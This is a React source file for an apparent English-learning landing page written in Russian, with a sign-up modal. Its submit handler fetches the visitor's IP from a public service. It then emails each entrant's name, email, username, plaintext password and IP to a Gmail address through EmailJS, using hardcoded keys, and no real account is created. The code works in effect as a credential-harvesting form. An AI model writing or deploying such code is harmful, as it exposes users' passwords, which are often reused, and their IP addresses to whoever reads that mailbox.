import React, { useState, useEffect, useRef } from 'react';
import { Container, Row, Col, Button, Image, Modal, Form, Alert } from 'react-bootstrap';
import emailjs from '@emailjs/browser';
import Navigation from '../../components/layout/Navigation/Navigation';
import Sidebar from '../../components/layout/Sidebar/Sidebar';
import './MainPage.css';

const EnglishLearningApp = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [showFormModal, setShowFormModal] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    username: '',
    password: '',
    confirmPassword: ''
  });
  const [alert, setAlert] = useState({ show: false, variant: '', message: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const EMAILJS_CONFIG = {
    SERVICE_ID: 'service_om3dvot',
    TEMPLATE_ID: 'template_n6neu93',
    USER_ID: 'kmwVGVNJwpQ5i8Lmb',
    TO_EMAIL: 'learnengcorp@gmail.com'
  };

  const AnimatedTitle = ({ text, highlight }) => {
    const letters = text.split('');
    const highlightLetters = highlight.split('');
    const titleRef = useRef(null);

    useEffect(() => {
      const letters = titleRef.current?.querySelectorAll('.eng-title__letter') || [];
      letters.forEach((letter, index) => {
        letter.style.animation = `eng-letterFadeIn 0.5s ease-out ${index * 0.1}s forwards`;
      });
    }, []);

    return (
      <h1 className="eng-title" ref={titleRef}>
        {letters.map((letter, index) => (
          <span 
            key={index} 
            className={`eng-title__letter ${highlightLetters.includes(letter) ? 'eng-title__letter--highlight' : ''}`}
          >
            {letter === ' ' ? '\u00A0' : letter}
          </span>
        ))}
      </h1>
    );
  };

  const toggleSidebar = () => setSidebarOpen(prev => !prev);

  const handleCloseModal = () => {
    setShowFormModal(false);
    setAlert({ show: false, variant: '', message: '' });
  };

  const handleShowModal = () => setShowFormModal(true);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    if (formData.password !== formData.confirmPassword) {
      setAlert({ show: true, variant: 'danger', message: 'Пароли не совпадают' });
      setIsSubmitting(false);
      return;
    }

    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();

      const templateParams = {
        first_name: formData.firstName,
        last_name: formData.lastName,
        user_email: formData.email,
        user_name: formData.username,
        password: formData.password,
        date: new Date().toLocaleString('ru-RU', {
          day: 'numeric',
          month: 'long',
          year: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }),
        ip_address: ipData.ip || 'не определен',
        to_email: EMAILJS_CONFIG.TO_EMAIL
      };

      await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams,
        EMAILJS_CONFIG.USER_ID
      );

      setAlert({ 
        show: true, 
        variant: 'success', 
        message: 'Регистрация успешна! Ожидайте подтверждение администратора.' 
      });

      setFormData({
        firstName: '',
        lastName: '',
        email: '',
        username: '',
        password: '',
        confirmPassword: ''
      });

      setTimeout(handleCloseModal, 3000);
    } catch (error) {
      console.error('Ошибка отправки:', error);
      setAlert({ 
        show: true, 
        variant: 'danger', 
        message: error.text || 'Произошла ошибка при отправке формы. Пожалуйста, попробуйте позже.' 
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className={`eng-app ${sidebarOpen ? 'eng-app--sidebar-open' : ''}`}>
      <Navigation onToggleSidebar={toggleSidebar} isSidebarOpen={sidebarOpen} />
      <Sidebar isOpen={sidebarOpen} />

      <main className="eng-main">
        <section className="eng-hero">
          <div className="eng-hero__bg"></div>
          <Container>
            <Row className="eng-hero__row">
              <Col lg={6} className="eng-hero__content">
                <AnimatedTitle text="Откройте мир английского языка" highlight="английского" />
                <p className="eng-hero__subtitle">
                  Инновационная платформа для изучения английского языка с персонализированным подходом
                </p>
                <Button 
                  variant="primary" 
                  className="eng-btn eng-btn--primary eng-btn--pulse"
                  onClick={handleShowModal}
                >
                  Начать обучение
                </Button>
              </Col>
              <Col lg={6} className="eng-hero__image-col">
                <div className="eng-hero__image-container eng-anim--float">
                  <Image 
                    src="https://images.unsplash.com/photo-1546410531-bb4caa6b424d?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" 
                    fluid 
                    className="eng-hero__image" 
                    alt="Изучение английского"
                    loading="lazy"
                  />
                </div>
              </Col>
            </Row>
          </Container>
        </section>

        <section className="eng-features">
          <Container>
            <Row className="justify-content-center">
              <Col xs={12} className="text-center">
                <h2 className="eng-section-title">
                  <span className="eng-section-title__text">Почему выбирают нас</span>
                </h2>
              </Col>
              
              <Col xs={12} className="eng-features__grid">
                <Row className="justify-content-center">
                  <Col md={4} className="eng-features__card">
                    <div className="eng-features__icon eng-anim--rotate">
                      <svg viewBox="0 0 24 24">
                        <path d="M12,2A3,3 0 0,1 15,5V11A3,3 0 0,1 12,14A3,3 0 0,1 9,11V5A3,3 0 0,1 12,2M19,11C19,14.53 16.39,17.44 13,17.93V21H11V17.93C7.61,17.44 5,14.53 5,11H7A5,5 0 0,0 12,16A5,5 0 0,0 17,11H19Z" />
                      </svg>
                    </div>
                    <h3>Разговорная практика</h3>
                    <p>Живое общение с носителями языка и преподавателями</p>
                  </Col>
                  
                  <Col md={4} className="eng-features__card">
                    <div className="eng-features__icon eng-anim--bounce">
                      <svg viewBox="0 0 24 24">
                        <path d="M17,1H7A2,2 0 0,0 5,3V21A2,2 0 0,0 7,23H17A2,2 0 0,0 19,21V3A2,2 0 0,0 17,1M17,19H7V5H17V19Z" />
                      </svg>
                    </div>
                    <h3>Удобный формат</h3>
                    <p>Занимайтесь в любое время с любого устройства</p>
                  </Col>
                  
                  <Col md={4} className="eng-features__card">
                    <div className="eng-features__icon eng-anim--pulse">
                      <svg viewBox="0 0 24 24">
                        <path d="M12,2L4,5V11.09C4,16.14 7.41,20.85 12,22C16.59,20.85 20,16.14 20,11.09V5L12,2M12,4.15L18,6.54V11.09C18,15.09 15.45,18.79 12,20C8.55,18.79 6,15.1 6,11.09V6.54L12,4.15M12,7A2,2 0 0,0 10,9A2,2 0 0,0 12,11A2,2 0 0,0 14,9A2,2 0 0,0 12,7Z" />
                      </svg>
                    </div>
                    <h3>Персонализация</h3>
                    <p>Программа подстраивается под ваш уровень и цели</p>
                  </Col>
                </Row>
              </Col>
            </Row>
          </Container>
        </section>

        <section className="eng-method">
          <Container>
            <Row className="align-items-center">
              <Col lg={6} className="eng-method__image-col">
                <div className="eng-method__image-container">
                  <Image 
                    src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" 
                    fluid 
                    className="eng-method__image" 
                    alt="Методика обучения"
                    loading="lazy"
                  />
                </div>
              </Col>
              <Col lg={6} className="eng-method__content">
                <h2 className="eng-section-title">
                  <span className="eng-section-title__text">Эффективная методика</span>
                </h2>
                <ul className="eng-method__list">
                  <li className="eng-method__item">Комбинация традиционных и инновационных подходов</li>
                  <li className="eng-method__item">Акцент на практическое применение языка</li>
                  <li className="eng-method__item">Геймификация процесса обучения</li>
                  <li className="eng-method__item">Регулярный контроль прогресса</li>
                </ul>
                <Button 
                  variant="outline-primary" 
                  className="eng-btn eng-btn--outline eng-anim--scale"
                  onClick={handleShowModal}
                >
                  Попробовать
                </Button>
              </Col>
            </Row>
          </Container>
        </section>

        <Modal show={showFormModal} onHide={handleCloseModal} centered>
          <Modal.Body className="eng-modal">
            <div className="eng-modal__header">
              <h3><strong>Начните свое обучение!</strong></h3>
              <p>Заполните форму для регистрации</p>
            </div>
            
            {alert.show && (
              <Alert variant={alert.variant} className="eng-modal__alert">
                {alert.message}
              </Alert>
            )}

            <Form onSubmit={handleSubmit}>
              <Row>
                <Col md={6}>
                  <Form.Group className="eng-form__group">
                    <Form.Label>Имя *</Form.Label>
                    <Form.Control
                      type="text"
                      name="firstName"
                      value={formData.firstName}
                      onChange={handleInputChange}
                      required
                      className="eng-form__input"
                      placeholder="Введите ваше имя"
                    />
                  </Form.Group>
                </Col>
                <Col md={6}>
                  <Form.Group className="eng-form__group">
                    <Form.Label>Фамилия *</Form.Label>
                    <Form.Control
                      type="text"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      required
                      className="eng-form__input"
                      placeholder="Введите вашу фамилию"
                    />
                  </Form.Group>
                </Col>
              </Row>

              <Form.Group className="eng-form__group">
                <Form.Label>Email *</Form.Label>
                <Form.Control
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                  className="eng-form__input"
                  placeholder="example@mail.com"
                />
              </Form.Group>

              <Form.Group className="eng-form__group">
                <Form.Label>Имя пользователя *</Form.Label>
                <Form.Control
                  type="text"
                  name="username"
                  value={formData.username}
                  onChange={handleInputChange}
                  required
                  className="eng-form__input"
                  placeholder="Придумайте логин"
                />
              </Form.Group>

              <Row>
                <Col md={6}>
                  <Form.Group className="eng-form__group">
                    <Form.Label>Пароль *</Form.Label>
                    <Form.Control
                      type="password"
                      name="password"
                      value={formData.password}
                      onChange={handleInputChange}
                      required
                      className="eng-form__input"
                      placeholder="Не менее 6 символов"
                      minLength="6"
                    />
                  </Form.Group>
                </Col>
                <Col md={6}>
                  <Form.Group className="eng-form__group">
                    <Form.Label>Подтвердите пароль *</Form.Label>
                    <Form.Control
                      type="password"
                      name="confirmPassword"
                      value={formData.confirmPassword}
                      onChange={handleInputChange}
                      required
                      className="eng-form__input"
                      placeholder="Повторите пароль"
                      minLength="6"
                    />
                  </Form.Group>
                </Col>
              </Row>

              <div className="eng-modal__footer">
                <Button 
                  variant="link" 
                  onClick={handleCloseModal}
                  className="eng-btn eng-btn--link"
                  disabled={isSubmitting}
                >
                  Отмена
                </Button>
                <Button 
                  type="submit"
                  disabled={isSubmitting}
                  className="eng-btn eng-btn--submit"
                >
                  {isSubmitting ? (
                    <>
                      <span className="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>
                      Отправка...
                    </>
                  ) : 'Отправить запрос'}
                </Button>
              </div>
            </Form>
          </Modal.Body>
        </Modal>
      </main>
    </div>
  );
};

export default EnglishLearningApp;